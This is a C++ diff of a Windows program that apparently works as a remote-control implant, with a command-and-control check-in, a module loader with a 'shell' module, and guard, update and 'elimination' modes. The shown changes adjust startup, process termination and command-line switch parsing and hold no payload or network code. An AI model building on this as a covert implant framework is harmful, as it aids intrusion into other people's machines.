@@ -55,8 +55,6 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 	Amendux::Candcel::Init();
 	Amendux::ModuleLoader::Init();
 
-	Amendux::ModuleLoader::Current()->RunModule(L"shell");
-
 	// Launch the checkin process
 	Amendux::Candcel::SpawnInterval(Amendux::Candcel::Current());
 
@@ -85,6 +83,20 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 	}
 
     return (int)msg.wParam;
+}
+
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ulCall, LPVOID lpReserved)
+{
+	switch (ulCall) {
+		case DLL_PROCESS_ATTACH:
+		case DLL_THREAD_ATTACH:
+		case DLL_THREAD_DETACH:
+		case DLL_PROCESS_DETACH:
+			break;
+	}
+
+	return TRUE;
 }
 
 
@@ -207,21 +219,26 @@ BOOL ParseCommandLine()
 				continue;
 			}
 
-			Amendux::Config::Current()->SetMode(Amendux::OperationMode::UPDATE);
-			Amendux::Process::EndProcess(pid);
+			// Give the main module some time to enter message loop
+			Sleep(10 * 1000);
 
-			while (true); // WOOAAAHH max troll hack!
+			Amendux::Config::Current()->SetMode(Amendux::OperationMode::UPDATE);
+			Amendux::Process::EndProcess(pid, 10);
+
+			// Give the main moduke some time to release mutex
+			Sleep(10 * 1000);
+
 			return true;
 		}
 
 		// Spawn a guard
-		if (!wcscmp(szCmd, L"/sg") || !wcscmp(szCmd, L"/SG")) {
+		if (!wcscmp(szCmd, L"/sg") || !wcscmp(szCmd, L"/SG") || !wcscmp(szCmd, L"/Sg") || !wcscmp(szCmd, L"/sG")) {
 			Amendux::Config::Current()->SetMode(Amendux::OperationMode::GUARD);
 			return true;
 		}
 
 		// Run elimination mode
-		if ((!wcscmp(szCmd, L"/el") || !wcscmp(szCmd, L"/EL")) && argCount > 2) {
+		if ((!wcscmp(szCmd, L"/el") || !wcscmp(szCmd, L"/EL") || !wcscmp(szCmd, L"/El") || !wcscmp(szCmd, L"/eL")) && argCount > 2) {
 			Amendux::Config::Current()->SetMode(Amendux::OperationMode::ELIMINATE);
 			return true;
 		}
